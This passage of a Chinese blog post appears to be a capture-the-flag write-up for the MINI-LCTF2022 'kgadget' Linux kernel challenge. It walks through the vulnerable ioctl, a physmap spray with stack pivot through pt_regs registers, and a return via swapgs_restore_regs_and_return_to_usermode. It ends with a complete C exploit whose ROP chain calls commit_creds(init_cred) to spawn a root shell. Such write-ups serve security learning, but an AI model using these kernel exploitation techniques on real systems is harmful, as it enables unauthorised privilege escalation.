<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chown -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">chown 0:0 /flag</span><br><span class="line">chmod 400 /flag</span><br><span class="line">chmod 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod kgadget.ko</span><br><span class="line">chmod 777 /dev/kgadget</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>

<p>然后是启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu kvm64,+smep,+smap \</span><br><span class="line">        -smp cores=2,threads=2 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -initrd ./root.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">        -s</span><br></pre></td></tr></table></figure>

<p>可以看到没开<code>kaslr</code>，开了<code>smep、smap</code></p>
<p>驱动中除了初始化的函数以外有用的只有ioctl函数</p>
<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-1.jpg" class>

<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-2.jpg" class>

<p>从<code>init</code>文件可知不能用<code>dmesg</code>，所以第一个printk()其实没有意义</p>
<p>ioctl中有用的部分可以分成两块，红框那些部分相当于<code>call rdx</code></p>
<p>橙框那部分经过调试可知是先把rax抬到栈底，然后基于rax把在栈底的<code>pt_regs</code>结构体中的部分寄存器修改成了垃圾数据，到最后执行到<code>call rdx</code>时可以发现除去用来系统调用的寄存器外，还能被我们控制的寄存器只剩下<code>r9、r8</code></p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>传入的rdx是猜测的一个内存页的地址，里面保存了写入的ROP链。如果call命中内存页的话那么大概率会是<code>add rsp;ret</code>指令，但是要注意的是虽然rip指向了我们写ROP的位置，但是rsp还是在内核栈上，所以要把rsp迁移到ROP的位置，此时要做到这点就只能通过<code>pop rsp;ret</code>这种指令，要成功完成这点就需要布置<code>pop rsp;ret</code>跟要pop的值，且能够执行<code>pop rsp;ret</code></p>
<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-3.png" class>

<p>从这张图可以算出在程序流程走到执行我们布置的ROP时rsp跟pt_regs中r9的位置相差0xc0，也就是说如果能找到一条等价于<code>add rsp,0xc0;ret</code>的指令，就能完成将栈迁移到我们布置ROP的内存页上了</p>
<p>实际搜索时发现没有直接<code>add rsp,0xc0;ret</code>这条指令</p>
<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-4.png" class>

<p>但是没关系，继续往下找0xb8、0xb0、0xa8……</p>
<img src="/2022/10/23/MINI-LCTF2022-kgadget/kgadget-5.png" class>

<p>然后在搜到0xa8时找到了一条等价的，那么就可以选择用这条gadget</p>
<h4 id="关于swapgs-restore-regs-and-return-to-usermode函数"><a href="#关于swapgs-restore-regs-and-return-to-usermode函数" class="headerlink" title="关于swapgs_restore_regs_and_return_to_usermode函数"></a>关于swapgs_restore_regs_and_return_to_usermode函数</h4><p>该函数的功能是将内核栈上的<code>pt_regs</code>结构体中的值pop回寄存器，然后返回到用户态。也就是说其里面就有swapgs和iretq的流程，目前学到的它的利用就是用它来代替拆散的<code>swapgs</code>和<code>iretq</code></p>
<p>从该函数的开始位置看起，关注下面的部分重点</p>
<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-1.jpg" class>

<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-2.jpg" class>

<img src="/2022/10/23/MINI-LCTF2022-kgadget/sw_rt-3.jpg" class>

<p>在函数进行一系列的pop指令之后会用rdi来保存当前rsp的值，然后将rsp切到另外一个地址，接着基于rdi来把原本地址上的部分值push到当前栈上。</p>
<p>那么很简单，如果要利用<code>swapgs_restore_regs_and_return_to_usermode</code>函数来进行<code>swapgs;iretq</code>的操作的话就可以选择跳到其地址+0x1B偏移处（也就是对应<code>mov rdi,rsp;</code>这条指令开始），然后布置两个padding，后面再接iretq的内容（从上面push和pop的关系可以知道，<code>[rdi]</code>会被pop掉，<code>[rdi + 8]</code>不会被push，从<code>[rdi + 10]</code>开始属于被<code>iretq</code>pop的内容）</p>
<p>也就是如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = swapgs_restore_regs_and_return_to_usermode+<span class="number">0x1B</span>;</span><br><span class="line">rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">rop[i++] = <span class="number">0xDEAFBEEF</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getshell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>+<span class="number">0x1B</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rsp = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0xa8_pop3 = <span class="number">0xffffffff81488561</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">size_t</span> fd;</span><br><span class="line"><span class="keyword">size_t</span> *map_spray[<span class="number">16000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> try_hit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_rflags,user_sp,user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs,cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss,ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*]Status has been saved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span>	</span>&#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">constructROPchain</span><span class="params">(<span class="keyword">size_t</span> *rop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i &lt; (page_size/<span class="number">8</span><span class="number">-0x30</span>);i++)</span><br><span class="line">		rop[i] = add_rsp_0xa8_pop3;</span><br><span class="line">	<span class="keyword">for</span>(;i &lt; (page_size/<span class="number">8</span><span class="number">-12</span>);i++)</span><br><span class="line">		rop[i] = ret;</span><br><span class="line">	rop[i++] = pop_rdi;</span><br><span class="line">	rop[i++] = init_cred;</span><br><span class="line">	rop[i++] = commit_creds;</span><br><span class="line">	rop[i++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">	rop[i++] = <span class="number">0xDEAFBEEF</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">	rop[i++] = (<span class="keyword">size_t</span>)getshell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = user_sp;</span><br><span class="line">	rop[i++] = user_ss;</span><br><span class="line">	rop[i++] = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open ERR!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">	map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	constructROPchain(map_spray[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*]spraying map&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">15000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		map_spray[i] = mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d mmap ERR!&quot;</span>,i);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memcpy</span>(map_spray[i],map_spray[<span class="number">0</span>],page_size);</span><br><span class="line">	&#125;</span><br><span class="line">	try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">	__asm__(<span class="string">&quot;mov r9,pop_rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov r8,try_hit;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rdi,fd;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rsi,0x1BF52;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rdx,try_hit;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov rax,16;&quot;</span></span><br><span class="line">			<span class="string">&quot;syscall;&quot;</span></span><br><span class="line">			);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">44</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
